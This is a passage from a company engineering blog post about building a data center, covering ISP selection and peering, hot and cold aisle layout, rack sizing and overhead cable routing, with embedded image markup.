Partnering with the wrong ISP in a region can lead to extra network hops (and thus latency) to reach specific target markets — or in the worst case — convoluted network routes. So for each region, we pick at least two separate networks based on their regional footprints. </span></p><p><span>Once connected, we receive full internet routing tables from each ISP and consolidate them on our network switches to resolve the best path for each IP prefix. If you have an end user in Australia trying to reach an app deployed to Singapore, we’ll likely hand those packets off directly to </span><a href="https://bgp.tools/as/4637#connectivity" target="_blank" rel="noreferrer noopener"><span>Telstra</span></a><span> who have one of the densest access networks in Australia. If that same app needs to send packets to a end-user or server in Japan, then we’d likely be handing them over to PCCW who peer directly with NTT in Japan and have a </span><a href="https://www.pccwglobal.com/wp-content/uploads/2019/11/world_fold_20191115.pdf" target="_blank" rel="noreferrer noopener"><span>dense footprint in APAC</span></a><span>.</span></p><div><p>👉</p><div><p><span>Peering information is public, head-over to </span><a href="https://bgp.tools/" target="_blank" rel="noreferrer noopener"><span>bgp.tools</span></a><span> to see how your favorite networks interconnect.</span></p></div></div><p><span>For redundancy we’re building out multiple zones in each region, and interconnectivity between these sites is also critical for our expansion. There are several tools such as dark fiber or wavelength services that we look for to plan this expansion. The result is that your apps won’t notice if your database is in the same room or if it’s 4 blocks over in a neighboring building — this is a feature not a bug — as it builds resilience against the failure of an individual data center.</span></p><p><span>...</span></p><p><span>Ok, now that you’ve found a space you like, signed a deal with a data center, and signed deals with several ISPs, you're all-systems-go to install some servers, right? </span></p><p><span>Well, not exactly. First you need a bunch of other things to give your server a nice snug home to warm up in.</span></p><p><a href="https://blog.railway.com/p/data-center-build-part-one#aisles,-racks-and-overhead-infrastructure"><h2><span>Aisles, racks and overhead infrastructure</span></h2></a></p><p><span>In a data center, racks are arranged in rows, and the space between racks, the aisle, is used for airflow. </span></p><p><span>The Cold Aisle is where cold air is blown in from the DC facility, and servers in your rack suck this air up and exhaust it towards the rear onto the Hot Aisle. The DC facility will remove this hot air from the Hot Aisle. For optimum efficiency, you don’t want air between these aisles to mix.</span></p><div><p><img alt="A cage schematic - all equipment must be mounted such that fans blow air from the cold aisle to the hot" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F228b8780-1812-43d5-8cf9-8dba7b20d979%2F3d2a676b-0ff6-4c62-a25e-c9db9c40a21a.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ddffbc032117c690a0b5cd4462bd3c68d4dc16c7e4a90d701c0e1fcf3a7203af0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>A cage schematic - all equipment must be mounted such that fans blow air from the cold aisle to the hot</p></div><p><span>The racks themselves have some variability, even if you opt to use conventional 19" wide equipment. You can select the height, width, and depth to suit your equipment and cabling needs. </span></p><p><span>Most server equipment can slide on rails to allow for easy maintenance, so it’s important to ensure that cage dimensions allow for this. Cabling and cable management also requires some space, so there’s a tradeoff to be made with how crowded you want each rack to be vs. how many racks you can fit into a cage. </span></p><p><span>In our experience, power and cooling is often the limiting factor rather than the actual space available. In newer sites we opt for wider 800mm racks to allow for better airflow by getting cables out of the way of the exhausts.</span></p><div><p><img alt="A rack-mount server on rails can be pulled out and serviced in place, each weighs nearly 20kg…" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F77195454-0644-498c-839e-6ed5d49ce03b%2FIMG_5261.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D5828fd5736a21ca8a4f18dec3fa9b4a8971bb2e37fabc745a37f71b84a9a4d55%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>A rack-mount server on rails can be pulled out and serviced in place, each weighs nearly 20kg…</p></div><p><span>In addition to racks, you'll need several bits of infrastructure to get power and data to your racks. This will likely involve installing some overhead infrastructure and trays that let you route fiber cables from the edge of your cage to each of your racks, and to route cables between racks. This is something the DC operator will throw in when quoting the cage.</span></p><p><span>Depending on your design, you’ll want to optimize for short cable paths by ensuring your overhead infrastructure, rack local cabling, and device orientations align. Because our racks have dense switch-to-server fiber cabling in each rack, we buy switches that have their ports oriented to the back of the rack (these are called reverse airflow switches because they exhaust air on the side with the network ports). </span></p><p><span>This allows us to align the cable trays such that all cabling happens on one side of the rack and there’s no zig-zagging of cables between the front and back of the rack.</span></p><div><p><img alt="A ladder rack and fibre cable tray allow routing cables to racks from above" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F3452ffbc-38b7-4b38-bf21-b94fdd9c7afb%2F4710_fiber_tray_and_top_rack.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3da072e52b6e59bd5ec4187bc7eeb570782925a7102878d328d18e1e7af29d27%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>A ladder rack and fibre cable tray allow routing cables to racks from above</p></div><p><span>So you’ve got the space, signed up ISPs, ordered the hardware, got the racks, and a pretty good picture on how to lay it all out. But it’s still a pretty expensive lego set sitting in the loading bay of a data center. To assemble it you now need to leverage the most versatile programming tool ever devised in the history of mankind … Microsoft Excel.</span></p><p><a href="https://blog.railway.com/p/data-center-build-part-one#the-rack-and-stack"><h2><span>The rack and stack</span></h2></a></p><p><span>Let’s first step back and publish a disclaimer: neat and organized cabling requires a lot of practice; we tried it ourselves first - with… </span><span>mixed…</span><span> results. </span></p><div><p><img alt="Our DIY attempts at cabling to get the first server online vs. what our installation partner put together" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, 